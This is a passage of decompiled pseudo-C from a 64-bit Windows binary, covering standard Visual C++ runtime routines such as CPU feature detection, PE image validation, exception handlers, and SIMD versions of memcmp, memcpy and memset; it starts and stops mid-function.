  v25 = (2LL * v23 + 16) & -(__int64)(2LL * v23 < (unsigned __int64)(2LL * v23 + 16));
  if ( v25 == 0 )
    goto LABEL_63;
  if ( v25 > 0x400 )
  {
    v29 = (WCHAR *)malloc_base(v25);
    v28 = v29;
    if ( v29 == nullptr )
      goto LABEL_53;
    *(_DWORD *)v29 = 56797;
  }
  else
  {
    v26 = v25 + 15;
    if ( v25 + 15 < v25 )
      v26 = 0xFFFFFFFFFFFFFF0LL;
    v27 = alloca(v26 & 0xFFFFFFFFFFFFFFF0uLL);
    v28 = (WCHAR *)&v35;
    if ( v34 == (_BYTE *)-80LL )
      goto LABEL_63;
    v35 = 52428;
  }
  v28 += 8;
LABEL_53:
  if ( v28 == nullptr )
  {
LABEL_63:
    v31 = v21 - 8;
    v32 = *((_DWORD *)v21 - 4) == 56797;
LABEL_64:
    if ( v32 )
      free_base(v31);
    return 0;
  }
  v30 = v28 - 8;
  if ( sub_140022950(v12, 1, v36, v11, v28, v24) == 0 )
  {
    if ( *(_DWORD *)v30 == 56797 )
      free_base(v30);
    v31 = v21 - 8;
    v32 = *((_DWORD *)v21 - 4) == 56797;
    goto LABEL_64;
  }
  v33 = sub_14001D23C(v37, v35, v21, v17, v28, v24, 0, 0, 0);
  if ( *(_DWORD *)v30 == 56797 )
    free_base(v30);
  if ( *((_DWORD *)v21 - 4) == 56797 )
    free_base(v21 - 8);
  return v33;
}


// ----- __acrt_CompareStringA @ 0x14002a518 -----
__int64 __fastcall _acrt_CompareStringA(
        struct __crt_locale_pointers *a1,
        __int64 a2,
        DWORD a3,
        const char *a4,
        int a5,
        char *a6,
        int a7,
        UINT a8)
{
  __int64 result; // rax
  __int64 v12; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v13[32]; // [rsp+48h] [rbp-20h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v12, a1);
  result = sub_14002A188((__int64)v13, a2, a3, a4, a5, a6, a7, a8);
  if ( v13[16] != 0 )
    *(_DWORD *)(v12 + 936) &= ~2u;
  return result;
}


// ----- sub_14002A5B0 @ 0x14002a5b0 -----
__int64 sub_14002A5B0()
{
  int v0; // r8d
  __int64 result; // rax

  v0 = 0;
  _RAX = 1;
  dword_1400A0BE8 = 0;
  __asm { cpuid }
  if ( (_RCX & 0x18001000) == 0x18001000 )
  {
    __asm { xgetbv }
    if ( (_RAX & 6) == 6 )
    {
      v0 = 1;
      dword_1400A0BE8 = 1;
    }
    else
    {
      v0 = dword_1400A0BE8;
    }
  }
  result = 0;
  if ( (v0 & 1) != 0 )
  {
    __asm { cpuid }
    if ( (int)_RAX < 7 )
    {
      result = 0;
    }
    else
    {
      _RAX = 7;
      __asm { cpuid }
      result = 0;
      if ( (_RBX & 0x20) != 0 )
      {
        dword_1400A0BE8 = 3;
        dword_1400A0BE4 = 3;
        return result;
      }
    }
  }
  dword_1400A0BE4 = v0;
  return result;
}


// ----- sub_14002A670 @ 0x14002a670 -----
__int64 __fastcall sub_14002A670(__int64 a1, unsigned __int64 a2)
{
  unsigned int v2; // r9d
  __int64 v3; // r8
  unsigned int v4; // r10d
  __int64 result; // rax
  unsigned __int64 v6; // r8

  v2 = 0;
  v3 = a1 + *(int *)(a1 + 60);
  v4 = *(unsigned __int16 *)(v3 + 6);
  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24LL;
  if ( *(_WORD *)(v3 + 6) == 0 )
    return 0;
  while ( 1 )
  {
    v6 = *(unsigned int *)(result + 12);
    if ( a2 >= v6 && a2 < (unsigned int)(v6 + *(_DWORD *)(result + 8)) )
      break;
    ++v2;
    result += 40;
    if ( v2 >= v4 )
      return 0;
  }
  return result;
}


// ----- sub_14002A6C0 @ 0x14002a6c0 -----
__int64 __fastcall sub_14002A6C0(__int64 a1)
{
  __int64 result; // rax

  result = ValidateImageBase(0x140000000uLL);
  if ( (_DWORD)result != 0 )
  {
    result = sub_14002A670(0x140000000LL, a1 - 0x140000000LL);
    if ( result != 0 )
      return *(_DWORD *)(result + 36) >= 0;
  }
  return result;
}


// ----- _ValidateImageBase @ 0x14002a710 -----
_BOOL8 __fastcall ValidateImageBase(__int64 a1)
{
  __int64 v1; // rdx

  return *(_WORD *)a1 == 23117 && *(_DWORD *)(v1 = a1 + *(int *)(a1 + 60)) == 17744 && *(_WORD *)(v1 + 24) == 523;
}


// ----- __GSHandlerCheck_SEH @ 0x14002a73c -----
EXCEPTION_DISPOSITION __fastcall _GSHandlerCheck_SEH(
        struct _EXCEPTION_RECORD *ExceptionRecord,
        void *EstablisherFrame,
        struct _CONTEXT *ContextRecord,
        struct _DISPATCHER_CONTEXT *DispatcherContext)
{
  char *v8; // rbx
  EXCEPTION_DISPOSITION result; // eax

  v8 = (char *)DispatcherContext->HandlerData + 16 * *(unsigned int *)DispatcherContext->HandlerData;
  sub_140010AA0((__int64)EstablisherFrame, (__int64)DispatcherContext);
  result = ExceptionContinueSearch;
  if ( ((((ExceptionRecord->ExceptionFlags & 0x66) != 0) + 1) & *((_DWORD *)v8 + 1)) != 0 )
    return _C_specific_handler(ExceptionRecord, EstablisherFrame, ContextRecord, DispatcherContext);
  return result;
}


// ----- __GSHandlerCheck_EH @ 0x14002a7c4 -----
__int64 __fastcall _GSHandlerCheck_EH(
        struct EHExceptionRecord *a1,
        unsigned __int64 a2,
        struct _CONTEXT *a3,
        __int64 a4)
{
  __int64 v4; // rbx
  __int64 result; // rax

  v4 = *(_QWORD *)(a4 + 56);
  sub_140010AA0(a2, a4);
  result = 1;
  if ( ((((a1->ExceptionFlags & 0x66) != 0) + 1) & *(_DWORD *)(v4 + 4)) != 0 )
    return _CxxFrameHandler3(a1, a2, a3, a4);
  return result;
}


// ----- _local_unwind @ 0x14002a844 -----
void __fastcall local_unwind(void *a1, void *a2)
{
  RtlUnwind(a1, a2, nullptr, nullptr);
}


// ----- __C_specific_handler_noexcept @ 0x14002a870 -----
EXCEPTION_DISPOSITION __fastcall _C_specific_handler_noexcept(
        __int64 a1,
        void *a2,
        struct _CONTEXT *a3,
        struct _DISPATCHER_CONTEXT *a4)
{
  EXCEPTION_DISPOSITION result; // eax

  result = _C_specific_handler((struct _EXCEPTION_RECORD *)a1, a2, a3, a4);
  if ( (*(_BYTE *)(a1 + 4) & 0x66) == 0 && *(_DWORD *)a1 == -529697949 && result == ExceptionContinueSearch )
  {
    *(_QWORD *)(sub_14001244C() + 32) = a1;
    *(_QWORD *)(sub_14001244C() + 40) = a3;
    sub_14001BA28();
  }
  return result;
}


// ----- sub_14002A8BC @ 0x14002a8bc -----
__int8 *__fastcall sub_14002A8BC(__int64 a1, unsigned __int8 a2)
{
  const __m128i *v2; // r8
  unsigned int v3; // r10d
  __int64 v4; // r9
  __m128i v5; // xmm0
  __m128i v6; // xmm4
  unsigned int i; // edx
  __m128i v8; // xmm1
  __int8 *v9; // rdx

  v2 = (const __m128i *)(a1 & 0xFFFFFFFFFFFFFFF0uLL);
  v3 = a2 | (a2 << 8);
  v4 = 0;
  v5 = _mm_loadu_si128((const __m128i *)(a1 & 0xFFFFFFFFFFFFFFF0uLL));
  v6 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(v3), 0), 0);
  for ( i = (-1 << (a1 & 0xF))
          & _mm_movemask_epi8((__m128i)_mm_or_ps(
                                         (__m128)_mm_cmpeq_epi8(v5, v6),
                                         (__m128)_mm_cmpeq_epi8(v5, (__m128i)0LL)));
        i == 0;
        i = _mm_movemask_epi8((__m128i)_mm_or_ps(
                                         (__m128)_mm_cmpeq_epi8(v8, v6),
                                         (__m128)_mm_cmpeq_epi8(v8, (__m128i)0LL))) )
  {
    v8 = _mm_loadu_si128(++v2);
  }
  _BitScanForward(&i, i);
  v9 = &v2->m128i_i8[i];
  if ( *v9 == (_BYTE)v3 )
    return v9;
  return (__int8 *)v4;
}


// ----- sub_14002A93C @ 0x14002a93c -----
const __m128i *__fastcall sub_14002A93C(const __m128i *a1, unsigned __int16 a2)
{
  int v2; // r10d
  __int64 v4; // r9
  __m128i v5; // xmm2
  __m128i v6; // xmm0
  unsigned int v7; // eax
  __int64 v8; // rax
  unsigned int v9; // edx
  unsigned __int16 *v10; // rdx

  v2 = a2;
  v4 = 0;
  v5 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(a2), 0), 0);
  while ( ((unsigned __int16)a1 & 0xFFFu) > 0xFF0uLL )
  {
    if ( a1->m128i_i16[0] == a2 )
      return a1;
    if ( a1->m128i_i16[0] == 0 )
      return nullptr;
    v8 = 2;
LABEL_8:
    a1 = (const __m128i *)((char *)a1 + v8);
  }
  v6 = _mm_loadu_si128(a1);
  v7 = _mm_movemask_epi8((__m128i)_mm_or_ps((__m128)_mm_cmpeq_epi16((__m128i)0LL, v6), (__m128)_mm_cmpeq_epi16(v6, v5)));
  if ( v7 == 0 )
  {
    v8 = 16;
    goto LABEL_8;
  }
  _BitScanForward(&v9, v7);
  v10 = (unsigned __int16 *)((char *)a1->m128i_u16 + v9);
  if ( *v10 == v2 )
    return (const __m128i *)v10;
  return (const __m128i *)v4;
}


// ----- _guard_dispatch_icall_nop @ 0x14002a9d0 -----
__int64 __fastcall guard_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// ----- _guard_xfg_dispatch_icall_nop @ 0x14002a9f0 -----
// attributes: thunk
__int64 __fastcall guard_xfg_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// ----- j__guard_dispatch_icall_nop @ 0x14002aa10 -----
// attributes: thunk
__int64 __fastcall j__guard_dispatch_icall_nop()
{
  __int64 (__fastcall *v0)(); // rax

  return v0();
}


// ----- memcmp @ 0x14002aa30 -----
int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size)
{
  signed __int64 v3; // rdx
  bool v4; // cf
  size_t v6; // r9
  unsigned __int64 v7; // rax
  size_t v8; // r9

  v3 = (_BYTE *)Buf2 - (_BYTE *)Buf1;
  if ( Size < 8 )
    goto mcmp30;
  for ( ; ((unsigned __int8)Buf1 & 7) != 0; --Size )
  {
    v4 = *(_BYTE *)Buf1 < *((_BYTE *)Buf1 + v3);
    if ( *(_BYTE *)Buf1 != *((_BYTE *)Buf1 + v3) )
      return -v4 - (v4 - 1);
    Buf1 = (char *)Buf1 + 1;
  }
  if ( Size >> 3 == 0 )
  {
mcmp30:
    if ( Size == 0 )
      return 0;
    while ( 1 )
    {
      v4 = *(_BYTE *)Buf1 < *((_BYTE *)Buf1 + v3);
      if ( *(_BYTE *)Buf1 != *((_BYTE *)Buf1 + v3) )
        break;
      Buf1 = (char *)Buf1 + 1;
      if ( --Size == 0 )
        return 0;
    }
    return -v4 - (v4 - 1);
  }
  v6 = Size >> 5;
  if ( Size >> 5 != 0 )
  {
    while ( 1 )
    {
      v7 = *(_QWORD *)Buf1;
      if ( *(_QWORD *)Buf1 != *(_QWORD *)((char *)Buf1 + v3) )
        break;
      v7 = *((_QWORD *)Buf1 + 1);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 8) )
        goto mcmp_adjust8;
      v7 = *((_QWORD *)Buf1 + 2);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 16) )
        goto mcmp_adjust16;
      v7 = *((_QWORD *)Buf1 + 3);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 24) )
      {
        Buf1 = (char *)Buf1 + 8;
mcmp_adjust16:
        Buf1 = (char *)Buf1 + 8;
mcmp_adjust8:
        Buf1 = (char *)Buf1 + 8;
        break;
      }
      Buf1 = (char *)Buf1 + 32;
      if ( --v6 == 0 )
      {
        Size &= 0x1Fu;
        goto mcmp70;
      }
    }
  }
  else
  {
mcmp70:
    v8 = Size >> 3;
    if ( Size >> 3 == 0 )
      goto mcmp30;
    while ( 1 )
    {
      v7 = *(_QWORD *)Buf1;
      if ( *(_QWORD *)Buf1 != *(_QWORD *)((char *)Buf1 + v3) )
        break;
      Buf1 = (char *)Buf1 + 8;
      if ( --v8 == 0 )
      {
        Size &= 7u;
        goto mcmp30;
      }
    }
  }
  v4 = _byteswap_uint64(v7) < _byteswap_uint64(*(_QWORD *)((char *)Buf1 + v3));
  return -v4 - (v4 - 1);
}


// ----- unknown_libname_52 @ 0x14002ab20 -----
// Microsoft VisualC v14 64bit runtime
void __fastcall unknown_libname_52(void *a1, const void *a2, unsigned __int64 a3)
{
  qmemcpy(a1, a2, a3);
}


// ----- memcpy @ 0x14002ab30 -----
void *__cdecl memcpy(void *_RCX, const void *Src, size_t Size)
{
  void *result; // rax
  int v4; // ecx
  __int16 v5; // r9
  char v6; // r10
  __int16 v7; // cx
  char v8; // r9
  __int16 v9; // r8
  char v10; // r9
  int v11; // ecx
  __int16 v12; // r9
  char v13; // r8
  int v14; // ecx
  char v15; // r9
  __int16 v16; // cx
  char v17; // cl
  int v18; // ecx
  __int16 v19; // r8
  char v20; // r8
  __m128i v21; // xmm2
  char *v22; // r9
  char *v23; // r9
  __int64 v26; // r9
  __m128i v59; // xmm0
  __m128i v60; // xmm5
  __int64 v61; // r9
  __m128i v62; // xmm2
  __m128i v63; // xmm3
  __m128i v64; // xmm4
  __m128i v65; // xmm2
  __m128i v66; // xmm3
  __m128i v67; // xmm4
  size_t v68; // r9
  __int128 v69; // xmm2
  signed __int64 v70; // rdx
  char *v71; // rcx
  __int128 v72; // xmm0
  unsigned __int64 v73; // rcx
  size_t v74; // r8
  _OWORD *v75; // r9
  __int128 v76; // xmm1
  size_t v77; // r9
  __int128 v78; // xmm0
  __int128 v79; // xmm1
  __int128 v80; // xmm1
  __int128 v81; // xmm1
  __int128 v82; // xmm0
  __int128 v83; // xmm1
  size_t i; // r9

  result = _RCX;
  switch ( Size )
  {
    case 0uLL:
      return result;
    case 1uLL:
      *(_BYTE *)_RCX = *(_BYTE *)Src;
      return result;
    case 2uLL:
      *(_WORD *)_RCX = *(_WORD *)Src;
      return result;
    case 3uLL:
      v13 = *((_BYTE *)Src + 2);
      *(_WORD *)_RCX = *(_WORD *)Src;
      *((_BYTE *)_RCX + 2) = v13;
      return result;
    case 4uLL:
      *(_DWORD *)_RCX = *(_DWORD *)Src;
      return result;
    case 5uLL:
      v20 = *((_BYTE *)Src + 4);
      *(_DWORD *)_RCX = *(_DWORD *)Src;
      *((_BYTE *)_RCX + 4) = v20;
      return result;
    case 6uLL:
      v19 = *((_WORD *)Src + 2);
      *(_DWORD *)_RCX = *(_DWORD *)Src;
      *((_WORD *)_RCX + 2) = v19;
      return result;
    case 7uLL:
      v9 = *((_WORD *)Src + 2);
      v10 = *((_BYTE *)Src + 6);
      *(_DWORD *)_RCX = *(_DWORD *)Src;
      *((_WORD *)_RCX + 2) = v9;
      *((_BYTE *)_RCX + 6) = v10;
      return result;
    case 8uLL:
      *(_QWORD *)_RCX = *(_QWORD *)Src;
      return result;
    case 9uLL:
      v17 = *((_BYTE *)Src + 8);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_BYTE *)result + 8) = v17;
      return result;
    case 0xAuLL:
      v16 = *((_WORD *)Src + 4);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_WORD *)result + 4) = v16;
      return result;
    case 0xBuLL:
      v7 = *((_WORD *)Src + 4);
      v8 = *((_BYTE *)Src + 10);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_WORD *)result + 4) = v7;
      *((_BYTE *)result + 10) = v8;
      return result;
    case 0xCuLL:
      v18 = *((_DWORD *)Src + 2);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_DWORD *)result + 2) = v18;
      return result;
    case 0xDuLL:
      v14 = *((_DWORD *)Src + 2);
      v15 = *((_BYTE *)Src + 12);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_DWORD *)result + 2) = v14;
      *((_BYTE *)result + 12) = v15;
      return result;
    case 0xEuLL:
      v11 = *((_DWORD *)Src + 2);
      v12 = *((_WORD *)Src + 6);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_DWORD *)result + 2) = v11;
      *((_WORD *)result + 6) = v12;
      return result;
    case 0xFuLL:
      v4 = *((_DWORD *)Src + 2);
      v5 = *((_WORD *)Src + 6);
      v6 = *((_BYTE *)Src + 14);
      *(_QWORD *)result = *(_QWORD *)Src;
      *((_DWORD *)result + 2) = v4;
      *((_WORD *)result + 6) = v5;
      *((_BYTE *)result + 14) = v6;
      return result;
    default:
      if ( Size <= 0x20 )
      {
        v21 = _mm_loadu_si128((const __m128i *)((char *)Src + Size - 16));
        *(__m128i *)_RCX = _mm_loadu_si128((const __m128i *)Src);
        *(__m128i *)((char *)_RCX + Size - 16) = v21;
        return result;
      }
      v22 = (char *)Src + Size;
      if ( _RCX <= Src )
        v22 = (char *)_RCX;
      if ( _RCX < v22 )
      {
        v69 = *(_OWORD *)Src;
        v70 = (_BYTE *)Src - (_BYTE *)_RCX;
        v71 = (char *)_RCX + Size;
        v72 = *(_OWORD *)&v71[v70 - 16];
        v73 = (unsigned __int64)(v71 - 16);
        v74 = Size - 16;
        if ( (v73 & 0xF) != 0 )
        {
          v75 = (_OWORD *)v73;
          v73 &= 0xFFFFFFFFFFFFFFF0uLL;
          v76 = v72;
          v72 = *(_OWORD *)(v73 + v70);
          *v75 = v76;
          v74 = v73 - (_QWORD)result;
        }
        v77 = v74 >> 7;
        if ( v74 >> 7 != 0 )
        {
          for ( *(_OWORD *)v73 = v72; ; *(_OWORD *)v73 = v83 )
          {
            v78 = *(_OWORD *)(v73 + v70 - 16);
            v79 = *(_OWORD *)(v73 + v70 - 32);
            v73 -= 128LL;
            *(_OWORD *)(v73 + 112) = v78;
            *(_OWORD *)(v73 + 96) = v79;
            v80 = *(_OWORD *)(v73 + v70 + 64);
            --v77;
            *(_OWORD *)(v73 + 80) = *(_OWORD *)(v73 + v70 + 80);
            *(_OWORD *)(v73 + 64) = v80;
            v81 = *(_OWORD *)(v73 + v70 + 32);
            *(_OWORD *)(v73 + 48) = *(_OWORD *)(v73 + v70 + 48);
            *(_OWORD *)(v73 + 32) = v81;
            v82 = *(_OWORD *)(v73 + v70 + 16);
            v83 = *(_OWORD *)(v73 + v70);
            if ( v77 == 0 )
              break;
            *(_OWORD *)(v73 + 16) = v82;
          }
          *(_OWORD *)(v73 + 16) = v82;
          v74 &= 0x7Fu;
          v72 = v83;
        }
        for ( i = v74 >> 4; i != 0; --i )
        {
          *(_OWORD *)v73 = v72;
          v73 -= 16LL;
          v72 = *(_OWORD *)(v73 + v70);
        }
        if ( (v74 & 0xF) != 0 )
          *(_OWORD *)result = v69;
        *(_OWORD *)v73 = v72;
        return result;
      }
      if ( (unsigned int)dword_14009E908 < 3 )
      {
        if ( Size <= 0x800 || (dword_1400A0078 & 2) == 0 )
        {
          v59 = _mm_loadu_si128((const __m128i *)Src);
          v60 = _mm_loadu_si128((const __m128i *)((char *)Src + Size - 16));
          if ( Size > 0x80 )
          {
            v61 = ((unsigned __int8)_RCX & 0xF) - 16LL;
            _RCX = (char *)_RCX - v61;
            Src = (char *)Src - v61;
            Size += v61;
            if ( Size > 0x80 )
            {
              do
              {
                v62 = _mm_loadu_si128((const __m128i *)Src + 1);
                v63 = _mm_loadu_si128((const __m128i *)Src + 2);
                v64 = _mm_loadu_si128((const __m128i *)Src + 3);
                *(__m128i *)_RCX = _mm_loadu_si128((const __m128i *)Src);
                *((__m128i *)_RCX + 1) = v62;
                *((__m128i *)_RCX + 2) = v63;
                *((__m128i *)_RCX + 3) = v64;
                v65 = _mm_loadu_si128((const __m128i *)Src + 5);
                v66 = _mm_loadu_si128((const __m128i *)Src + 6);
                v67 = _mm_loadu_si128((const __m128i *)Src + 7);
                *((__m128i *)_RCX + 4) = _mm_loadu_si128((const __m128i *)Src + 4);
                *((__m128i *)_RCX + 5) = v65;
                *((__m128i *)_RCX + 6) = v66;
                *((__m128i *)_RCX + 7) = v67;
                _RCX = (char *)_RCX + 128;
                Src = (char *)Src + 128;
                Size -= 128LL;
              }
              while ( Size >= 0x80 );
            }
          }
          v68 = (Size + 15) & 0xFFFFFFFFFFFFFFF0uLL;
          switch ( v68 >> 4 )
          {
            case 0uLL:
              goto LABEL_68;
            case 1uLL:
              goto LABEL_67;
            case 2uLL:
              goto LABEL_66;
            case 3uLL:
              goto LABEL_65;
            case 4uLL:
              goto LABEL_64;
            case 5uLL:
              goto LABEL_63;
            case 6uLL:
              goto LABEL_62;
            case 7uLL:
              goto LABEL_61;
            case 8uLL:
              *(__m128i *)((char *)_RCX + v68 - 128) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 128));
LABEL_61:
              *(__m128i *)((char *)_RCX + v68 - 112) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 112));
LABEL_62:
              *(__m128i *)((char *)_RCX + v68 - 96) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 96));
LABEL_63:
              *(__m128i *)((char *)_RCX + v68 - 80) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 80));
LABEL_64:
              *(__m128i *)((char *)_RCX + v68 - 64) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 64));
LABEL_65:
              *(__m128i *)((char *)_RCX + v68 - 48) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 48));
LABEL_66:
              *(__m128i *)((char *)_RCX + v68 - 32) = _mm_loadu_si128((const __m128i *)((char *)Src + v68 - 32));
LABEL_67:
              *(__m128i *)((char *)_RCX + Size - 16) = v60;
LABEL_68:
              *(__m128i *)result = v59;
              break;
          }
          return result;
        }
LABEL_81:
        unknown_libname_52(_RCX, Src, Size);
        return result;
      }
      if ( Size > 0x2000 && Size <= 0x180000 )
      {
        v23 = (char *)_RCX + 64;
        if ( _RCX > Src )
          v23 = (char *)Src;
        if ( v23 <= Src && (dword_1400A0078 & 2) != 0 )
          goto LABEL_81;
      }
      __asm
      {
        vmovdqu ymm0, ymmword ptr [rdx]
        vmovdqu ymm5, ymmword ptr [rdx+r8-20h]
      }
      if ( Size <= 0x100
        || (v26 = ((unsigned __int8)_RCX & 0x1F) - 32LL,
            _RCX = (char *)_RCX - v26,
            Src = (char *)Src - v26,
            Size += v26,
            Size <= 0x100) )
      {
LABEL_33:
        _R9 = (Size + 31) & 0xFFFFFFFFFFFFFFE0uLL;
        switch ( _R9 >> 5 )
        {
          case 0uLL:
            goto LABEL_42;
          case 1uLL:
            goto LABEL_41;
          case 2uLL:
            goto LABEL_40;
          case 3uLL:
            goto LABEL_39;
          case 4uLL:
            goto LABEL_38;
          case 5uLL:
            goto LABEL_37;
          case 6uLL:
            goto LABEL_36;
          case 7uLL:
            goto LABEL_35;
          case 8uLL:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 000000014002ADB2 case 8
              vmovdqu ymmword ptr [rcx+r9-100h], ymm1
            }
LABEL_35:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 000000014002ADB2 case 7
              vmovdqu ymmword ptr [rcx+r9-0E0h], ymm1
            }
LABEL_36:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 000000014002ADB2 case 6
              vmovdqu ymmword ptr [rcx+r9-0C0h], ymm1
            }
LABEL_37:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 000000014002ADB2 case 5
              vmovdqu ymmword ptr [rcx+r9-0A0h], ymm1
            }
LABEL_38:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 000000014002ADB2 case 4
              vmovdqu ymmword ptr [rcx+r9-80h], ymm1
            }
LABEL_39:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 000000014002ADB2 case 3
              vmovdqu ymmword ptr [rcx+r9-60h], ymm1
            }
LABEL_40:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 000000014002ADB2 case 2
              vmovdqu ymmword ptr [rcx+r9-40h], ymm1
            }
LABEL_41:
            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 000000014002ADB2 case 1 }
LABEL_42:
            __asm
            {
              vmovdqu ymmword ptr [rax], ymm0; jumptable 000000014002ADB2 case 0
              vzeroupper
            }
            break;
        }
        return result;
      }
      if ( Size <= 0x180000 )
      {
        do
        {
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx]
            vmovdqu ymm2, ymmword ptr [rdx+20h]
            vmovdqu ymm3, ymmword ptr [rdx+40h]
            vmovdqu ymm4, ymmword ptr [rdx+60h]
            vmovdqa ymmword ptr [rcx], ymm1
            vmovdqa ymmword ptr [rcx+20h], ymm2
            vmovdqa ymmword ptr [rcx+40h], ymm3
            vmovdqa ymmword ptr [rcx+60h], ymm4
            vmovdqu ymm1, ymmword ptr [rdx+80h]
            vmovdqu ymm2, ymmword ptr [rdx+0A0h]
            vmovdqu ymm3, ymmword ptr [rdx+0C0h]
            vmovdqu ymm4, ymmword ptr [rdx+0E0h]
            vmovdqa ymmword ptr [rcx+80h], ymm1
            vmovdqa ymmword ptr [rcx+0A0h], ymm2
            vmovdqa ymmword ptr [rcx+0C0h], ymm3
            vmovdqa ymmword ptr [rcx+0E0h], ymm4
          }
          _RCX = (char *)_RCX + 256;
          Src = (char *)Src + 256;
          Size -= 256LL;
        }
        while ( Size >= 0x100 );
        goto LABEL_33;
      }
      do
      {
        __asm
        {
          vmovdqu ymm1, ymmword ptr [rdx]
          vmovdqu ymm2, ymmword ptr [rdx+20h]
          vmovdqu ymm3, ymmword ptr [rdx+40h]
          vmovdqu ymm4, ymmword ptr [rdx+60h]
          vmovntdq ymmword ptr [rcx], ymm1
          vmovntdq ymmword ptr [rcx+20h], ymm2
          vmovntdq ymmword ptr [rcx+40h], ymm3
          vmovntdq ymmword ptr [rcx+60h], ymm4
          vmovdqu ymm1, ymmword ptr [rdx+80h]
          vmovdqu ymm2, ymmword ptr [rdx+0A0h]
          vmovdqu ymm3, ymmword ptr [rdx+0C0h]
          vmovdqu ymm4, ymmword ptr [rdx+0E0h]
          vmovntdq ymmword ptr [rcx+80h], ymm1
          vmovntdq ymmword ptr [rcx+0A0h], ymm2
          vmovntdq ymmword ptr [rcx+0C0h], ymm3
          vmovntdq ymmword ptr [rcx+0E0h], ymm4
        }
        _RCX = (char *)_RCX + 256;
        Src = (char *)Src + 256;
        Size -= 256LL;
      }
      while ( Size >= 0x100 );
      _R9 = (Size + 31) & 0xFFFFFFFFFFFFFFE0uLL;
      switch ( _R9 >> 5 )
      {
        case 0uLL:
          goto LABEL_53;
        case 1uLL:
          goto LABEL_52;
        case 2uLL:
          goto LABEL_51;
        case 3uLL:
          goto LABEL_50;
        case 4uLL:
          goto LABEL_49;
        case 5uLL:
          goto LABEL_48;
        case 6uLL:
          goto LABEL_47;
        case 7uLL:
          goto LABEL_46;
        case 8uLL:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 000000014002AEE2 case 8
            vmovntdq ymmword ptr [rcx+r9-100h], ymm1
          }
LABEL_46:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 000000014002AEE2 case 7
            vmovntdq ymmword ptr [rcx+r9-0E0h], ymm1
          }
LABEL_47:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 000000014002AEE2 case 6
            vmovntdq ymmword ptr [rcx+r9-0C0h], ymm1
          }
LABEL_48:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 000000014002AEE2 case 5
            vmovntdq ymmword ptr [rcx+r9-0A0h], ymm1
          }
LABEL_49:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 000000014002AEE2 case 4
            vmovntdq ymmword ptr [rcx+r9-80h], ymm1
          }
LABEL_50:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 000000014002AEE2 case 3
            vmovntdq ymmword ptr [rcx+r9-60h], ymm1
          }
LABEL_51:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 000000014002AEE2 case 2
            vmovntdq ymmword ptr [rcx+r9-40h], ymm1
          }
LABEL_52:
          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 000000014002AEE2 case 1 }
LABEL_53:
          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 000000014002AEE2 case 0 }
          _mm_sfence();
          __asm { vzeroupper }
          break;
      }
      return result;
  }
}


// ----- memset_repstos @ 0x14002b1e0 -----
__int64 __fastcall memset_repstos(void *a1, char a2, unsigned __int64 a3, __int64 a4)
{
  memset(a1, a2, a3);
  return a4;
}


// ----- memset @ 0x14002b1f0 -----
void *__cdecl memset(void *a1, int Val, size_t Size)
{
  void *result; // rax
  __int64 v6; // r11
  char *v8; // rcx
  __m128i v9; // xmm0
  __int64 v11; // r9
  __int64 v16; // r9
  __m128i *v17; // rcx
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9

  result = a1;
  v6 = 0x101010101010101LL * (unsigned __int8)Val;
  v8 = (char *)a1 + Size;
  switch ( Size )
  {
    case 0uLL:
      return result;
    case 1uLL:
      goto LABEL_5;
    case 2uLL:
      goto LABEL_8;
    case 3uLL:
      goto LABEL_4;
    case 4uLL:
      goto LABEL_12;
    case 5uLL:
      goto LABEL_10;
    case 6uLL:
      goto LABEL_7;
    case 7uLL:
      goto LABEL_3;
    case 8uLL:
      *((_QWORD *)v8 - 1) = v6;
      return result;
    case 9uLL:
      *(_QWORD *)(v8 - 9) = v6;
      *(v8 - 1) = Val;
      return result;
    case 0xAuLL:
